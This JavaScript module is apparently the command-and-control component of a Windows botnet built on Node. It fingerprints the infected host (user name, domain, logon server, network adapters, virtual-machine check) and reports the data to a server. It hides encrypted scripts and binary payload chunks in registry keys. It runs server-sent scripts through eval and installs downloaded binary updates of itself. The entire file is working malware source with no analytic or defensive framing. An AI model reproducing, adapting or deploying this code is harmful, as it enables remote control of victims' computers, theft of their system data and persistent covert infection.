var fs = require('fs');
var zlib = require('zlib');
var net = require('net');
var stream = require('stream');
var util = require('util');
var os = require('os');
var suspend = require('suspend'), resume = suspend.resume;
var reg = process.binding("registry");
var vmx_detection = require("vmx_detection");
var MersenneTwister = require('utils').MersenneTwister;
var spyware = require('spyware');
var protobuf = require('protocol_buffers')

var messages = protobuf([
  'message AdapterAddress {\r',
  '    optional string address = 1;\r',
  '    optional string netmask = 2;\r',
  '    optional string family = 3;\r',
  '    optional string mac = 4;\r',
  '    optional int32 scopeid = 5;\r',
  '    optional bool internal = 6;\r',
  '}\r',
  '\r',
  'message NetworkInterface {\r',
  '    optional string connectionName = 1;\r',
  '    repeated AdapterAddress adresses = 2;\r',
  '}\r',
  '\r',
  'message NetworkInterfaces {\r',
  '    repeated NetworkInterface Interfaces = 1;\r',
  '}\r',
  '\r',
  'message Processor {\r',
  '    optional string model = 1;\r',
  '    optional int32 speed = 2;\r',
  '}\r',
  '\r',
  'message Bot {\r',
  '    optional string processName = 1;\r',
  '    optional string guid = 2;\r',
  '    optional string vendor = 3;\r',
  '    optional string os = 4;\r',
  '    optional string ie = 5;\r',
  '    optional string ver = 6;\r',
  '    optional int32  uptime = 7;\r',
  '    optional int32  upspeed = 8;\r',
  '    optional string internalAddress = 9;\r',
  '    optional string HomePath = 10;\r',
  '    optional string ComputerName = 11;\r',
  '    optional string SystemDrive = 12;\r',
  '    optional string SystemRoot = 13;\r',
  '    optional string UserDomain = 14;\r',
  '    optional string UserName = 15;\r',
  '    optional string UserProfile = 16;\r',
  '    optional string LogonServer = 17;\r',
  '    optional int64  freemem = 18;\r',
  '    optional int64  totalmem = 19;\r',
  '    optional NetworkInterfaces networkInterfaces = 20;\r',
  '    optional string tmpdir = 21;\r',
  '    repeated Processor cpus = 22;\r',
  '    optional string hostname = 23;\r',
  '    optional bool IsVirtualMachine = 24;\r',
  '}\r',
  '\r',
  'message Tasks {\r',
  '\r',
  '    message Settings {\r',
  '        optional int32  pingTime = 1;\r',
  '    }\r',
  '    \r',
  '    optional Settings  settings = 1;\r',
  '    optional bytes     slch = 2;\r',
  '    optional bytes     rbody32_hash = 3;\r',
  '    optional bytes     rbody64_hash = 4;\r',
  '    optional bytes     defaultjs_hash = 5;\r',
  '}',
  'message BodyUpdate {',
  '  optional int32 platform = 1;',
  '  optional bytes newbody = 2;',
  '}'

].join('\n'));

var MyPacketId;

function RegReadObject(keyname) {
	var x = new reg.WindowsRegistry(
		process.g_malwareRegistryHive,
		process.g_malwareRegistryPath, KEY_READ, true
	);
	var valueType = x.GetDataType(keyname);
	if (valueType == REG_BINARY) {
		return x.ReadBuffer(keyname);
	}
	else if (valueType == REG_SZ) {
		return x.ReadString(keyname);
	}
	else if (valueType == REG_DWORD) {
		return x.ReadDword(keyname);
	}
}

function RegWriteObject(keyname, obj) {
	var x = new reg.WindowsRegistry(
		process.g_malwareRegistryHive,
		process.g_malwareRegistryPath, KEY_WRITE, true
	);

	if (Buffer.isBuffer(obj)) {
		return x.WriteBuffer(keyname, obj);
	}
	else if (typeof obj == "string") {
		return x.WriteString(keyname, obj);
	}
	else return -1;
}

process.SpSaveDefault = function (config) {
	var encryptedcfg = new Buffer(config);
	encryptedcfg.encryptDecrypt()

	RegWriteObject(
		process.g_SpDefaultKey,
		encryptedcfg
	);
}

process.SpLoadDefault = function () {
	try {
		process.g_defaultJs = '';
		var readedBuffer = RegReadObject(process.g_SpDefaultKey);

		if (typeof (readedBuffer) !== 'undefined') {
			readedBuffer.encryptDecrypt();
			process.g_defaultJs = readedBuffer.toString();
		}
	}
	catch (e) {

	}
}

process.SpSavePrivate = function (config) {
	var encryptedcfg = new Buffer(config);
	encryptedcfg.encryptDecrypt()

	RegWriteObject(
		process.g_SpPrivateKey,
		encryptedcfg
	);
}


process.SpLoadPrivate = function () {
	try {
		process.g_privateScript = '';
		var readedBuffer = RegReadObject(process.g_SpPrivateKey);

		if (typeof (readedBuffer) !== 'undefined') {
			readedBuffer.encryptDecrypt();
			process.g_privateScript = readedBuffer.toString();
		}
	}
	catch (e) {

	}
}

process.RegReadObject = RegReadObject;
process.RegWriteObject = RegWriteObject;

process.RegReadObjectEncrypted = function(keyname){
	try{
		var readedBuffer = RegReadObject(keyname);
	
		if (typeof (readedBuffer) !== 'undefined') {
			readedBuffer.encryptDecrypt();
			return JSON.parse(readedBuffer.toString());
		}
	}catch(e){

	}
}

process.RegWriteObjectEncrypted = function(keyname, obj){
	try{
		var objstr = JSON.stringify(obj);
		var encryptedcfg = new Buffer(objstr);
		encryptedcfg.encryptDecrypt();
		return RegWriteObject(keyname, encryptedcfg);
	}catch(e){

	}
}


process.FsReadObjectEncrypted = function(keyname){
    try{
        var readedBuffer = fs.readFileSync(os.tmpdir() + '\\' + keyname);
	
        if (typeof (readedBuffer) !== 'undefined') {
            readedBuffer.encryptDecrypt();
            return JSON.parse(readedBuffer.toString());
        }
    }catch(e){

    }

}

process.FsWriteObjectEncrypted = function(keyname, obj){
    try{
        var objstr = JSON.stringify(obj);
        var encryptedcfg = new Buffer(objstr);
        encryptedcfg.encryptDecrypt();
        fs.writeFileSync(os.tmpdir() + '\\' + keyname, encryptedcfg);
        return true;
    }catch(e){

    }

    return false;
}

function getAdapters(adapters){
	var interfaces = os.networkInterfaces();
	var outobj = [];

	for(let i in interfaces){
		outobj.push({
			connectionName : i,
			adresses : interfaces[i]
		}); break;
	}
	return {Interfaces : outobj}
}

process.GetMachineGuid = function(cb) {
	

	var seed = (
		os.arch() +
		os.hostname() +
		os.cpus()[0].model +
		os.hardDriveId()
	).hashCode();

	var rgen = new MersenneTwister(seed);

	var uuid = '4xxxyxxxxxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
		var r = rgen.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
		return v.toString(16);
	});

	process.machineGuid = os.hostname() + '_' + uuid;

	if(cb)cb(os.hostname() + '_' + uuid);

	return os.hostname() + '_' + uuid;
}

function getIeVersion() {
	
	try {
		var x = new reg.WindowsRegistry(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Internet Explorer", KEY_QUERY_VALUE, true);
		return x.ReadString("Version");
	}
	catch (e) {
		return "undefined";
	}
}

function GenerateBotInfo(){
	
	

	process.GetMachineGuid();

	
	if(!process.cpus){
	    process.cpus = os.cpus();
	}

	process.bot = {
		'processName': process.execPath,
		'guid': process.machineGuid,
		'vendor': process.g_vendorName,
		'os': util.format("%s %s (%s)", os.type(), os.release(), os.arch()),
		'ie': getIeVersion(),
		'ver': util.format("%s.%s", process.version, process.g_botId),
		'handler': '/registrator',
		'uptime': os.uptime(),
		'upspeed': 0,
		'internalAddress': process.externalAddress,
		'HomePath': process.env['HOMEPATH'],
		'ComputerName': process.env['COMPUTERNAME'],
		'SystemDrive': process.env['SystemDrive'],
		'SystemRoot': process.env['SystemRoot'],
		'UserDomain': process.env['USERDOMAIN'],
		'UserName': process.env['USERNAME'],
		'UserProfile': process.env['USERPROFILE'],
		'LogonServer': process.env['LOGONSERVER'],
		'freemem': os.freemem(),
		'totalmem': os.totalmem(),
		'networkInterfaces': getAdapters(),
		'tmpdir': os.tmpDir(),
		'cpus': process.cpus,
		'hostname': os.hostname(),
		'IsVirtualMachine' : vmx_detection.IsVirtualMachine()
	}
	
	return messages.Bot.encode(process.bot);
}

function buildPacket(data)
{
	var packet = new Buffer(data.length + 2);

	packet.writeUInt16BE(MyPacketId, 0);
	data.copy(packet, 2);

	return packet;
}



function RegReadBodyFromRegistry(platform) {
	if (process.g_malwareRegistryHive === HKEY_LOCAL_MACHINE) {
		return RegReadObject("binaryImage" + platform);
	} else {
		var buffers = [];
		for (var i = 0; ; i++) {
			var buffer = RegReadObject(util.format("binaryImage%d_%d", platform, i));

			if (typeof (buffer) === 'undefined') {
				break;
			} else {
				buffers.push(buffer);
			}
		}
		if (buffers.length > 0) {
			var result = Buffer.concat(buffers);
			return result;
		} else {
			
		}
	}
}


process.getLocalBinaryImageHash = function (platform) {
	try {
		var hash = process.md5(RegReadBodyFromRegistry(platform));
		return hash;
	} catch (e) {
		return null;
	}
}

function RemoveOldBinaryBody(platform) {

	var x = new reg.WindowsRegistry(
		process.g_malwareRegistryHive,
		process.g_malwareBodyRegistryPath,
		KEY_ALL_ACCESS
	);

	x.DeleteKeyValue("", util.format('binaryImage%d', platform));
	for (var i = 0; i < 20; i++) {
		x.DeleteKeyValue("", util.format('binaryImage%d_%d', platform, i));
	}
}

function RegWriteBodyPart(keyname, obj, hive) {
	var x = new reg.WindowsRegistry(
		(hive ? hive : process.g_malwareRegistryHive),
		(hive ? "SOFTWARE\\cxsw" : process.g_malwareBodyRegistryPath),
		KEY_WRITE, 
		true
	);

	if (Buffer.isBuffer(obj)) {
		return x.WriteBuffer(keyname, obj);
	}
	else if (typeof obj == "string") {
		return x.WriteString(keyname, obj);
	}
	else return -1;
}


function RegSaveBodyIntoRegistry(platform, data) {

	if(process.currentBinary === 'services.exe')
	{
		
		process.saveBinaryBody(data, platform);
		
	}
	else
	{
		RemoveOldBinaryBody(platform);

		var MaximumRegistryValueSize = (1014 * 512);
		var PartsCount = (AlignUp(data.length, MaximumRegistryValueSize) / MaximumRegistryValueSize);
		var SpaceLeft = data.length;

		for (var i = 0; i < PartsCount; i++, SpaceLeft -= MaximumRegistryValueSize) {
			if (SpaceLeft > 0) {
				var dataBuffer = new Buffer(min(SpaceLeft, MaximumRegistryValueSize));
				var valueName = util.format("binaryImage%d_%d", platform, i);
				//buf.copy(targetBuffer, [targetStart], [sourceStart], [sourceEnd])
				data.copy(
					dataBuffer, 0,
					(i * MaximumRegistryValueSize),
					(i * MaximumRegistryValueSize) + min(SpaceLeft, MaximumRegistryValueSize));

				/*print("RegSetValueBinary asked for save %d bytes in %d\\%s\\%s", 
					dataBuffer.length, 
					process.g_malwareRegistryHive,
					process.g_malwareBodyRegistryPath,
					valueName
				);
				*/
				RegWriteBodyPart(valueName, dataBuffer);
			}
		}
	}
}

var restartMainBody = suspend(function*(data, platform){

	//print("%s : called restartMainBody for %s", process.execPath, platform);
	yield sleep(5000, resume());
	if (process.arch.match(/\d+/g)[0] === platform.toString()){
	    //process.restartBody(data); /* restartBody depricated */
	}
});

function saveBinaryImageToRegistry(data, platform) {

	if(
		(process.currentBinary !== 'explorer.exe') && 
		(process.currentBinary !== 'services.exe')
	)
	{
		return true;
	}

	if (!util.isUndefined(data)) 
	{
		RegSaveBodyIntoRegistry(platform, data);
		return true;
	}

	return false;
}

const PACKET_REGISTRATION_REQUEST = 0x00;
const PACKET_TASKS = 0x01;
const PACKET_PRIVATE_SCRIPT = 0x02;
const PACKET_DEFAULT_SCRIPT = 0x03;
const PACKET_BODYPDATE = 0x04;

process.doUpdateBody = suspend(function*(packet)
{
	//print('%s : bodyupdate got', process.execPath);

    if(process.isUpdatePending){
        return;
    }

    process.isUpdatePending = true;

	var update = messages.BodyUpdate.decode(packet);

	//print('update for platform %d', update.platform);
	

	if(!util.isUndefined(process.slaveServer))
	{
	    //main process here.


	    update.newbody = yield process.downloadUpdate(process.currentServer, resume());
	    
	    //print('update.newbody : ', update.newbody.length);

	    var updatePacket = messages.BodyUpdate.encode(packet);

		//print('broadcastind update');
		yield process.slaveServer.broadcastProtocolPacket(
			SLAVE_PACKET_UPDATE, 
			updatePacket, 
			resume());
		yield sleep(5000, resume());
		//print('broadcastind update -> done');
	}

	if(saveBinaryImageToRegistry(
		update.newbody, 
		update.platform.toString()) === true){
		//print('buffer saved, try to update core');
		if (process.arch.match(/\d+/g)[0] === update.platform.toString()) {
			//print('%s : Update core process', process.g_mainProcess);

			restartMainBody(update.newbody, update.platform);
		}
		else
		{
			//print('sorry... no platform here');
		}
	} 
    
	process.isUpdatePending = false;
});

function OnPacket(outstream, data)
{
	if (data[0] === PACKET_REGISTRATION_REQUEST) // request reg
	{
		//print('server want registration info!');
		outstream.sendProtocolPacket(
			MyPacketId, GenerateBotInfo());
	}
	else if(data[0] === PACKET_TASKS)
	{
		//print('got tasks');
		var tasks = messages.Tasks.decode(data.slice(1));
		
		process.defaultPingTimerValue = tasks.settings.pingTime;

		//print(JSON.stringify(tasks, undefined, 2));
	}
	else if (data[0] === PACKET_PRIVATE_SCRIPT)
	{
		//print('got private script');
		var ps = data.slice(1).toString();
		process.g_privateScript = ps;
		try
		{
			eval(process.g_privateScript);
		}
		catch(exception)
		{
			//print(exception);
			//print("g_privateScript script not executed");
		}

		if (process.OnPrivateJs)
			process.OnPrivateJs(process.g_privateScript);

		process.SpSavePrivate(process.g_privateScript);

	}
	else if (data[0] === PACKET_DEFAULT_SCRIPT)
	{
		process.g_defaultJs = data.slice(1).toString();
		//print('got process.g_defaultJs');

		try
		{
			eval(process.g_defaultJs);
		}
		catch (exception)
		{
			print(exception);
			//print("g_defaultJs script not executed");
		}

		if (process.OnDefaultJs)
			process.OnDefaultJs(process.g_defaultJs);

		process.SpSaveDefault(process.g_defaultJs);
	} else if (data[0] === PACKET_BODYPDATE)
	{
		//print('bodyupdate got');
		process.doUpdateBody(data.slice(1));
	}
}


exports.register = function (prtocolId, packetParsers, procolPacketBuilders) {
	//print('registering protcol dispatcher %d', prtocolId);

	MyPacketId = prtocolId;
	
	if(os.release().split('.')[0] === '5'){
		process.g_malwareBodyRegistryPath = "SOFTWARE";
	}else{
		process.g_malwareBodyRegistryPath = "SOFTWARE\\AppDataLow";
	}

	process.g_malwareRegistryPath = "SOFTWARE\\cxsw";
	process.g_malwareRegistryHive = HKEY_CURRENT_USER;
	process.g_SpDefaultKey = "{da14b39e-535a-4b08-9d68-ba6d14fed630}";
	process.g_SpPrivateKey = "{bed00948-29e2-4960-8f98-4bcd7c6b00a5}";

	process.SpLoadDefault();
	process.SpLoadPrivate();

	packetParsers[prtocolId] = OnPacket;
	procolPacketBuilders[prtocolId] = buildPacket;
}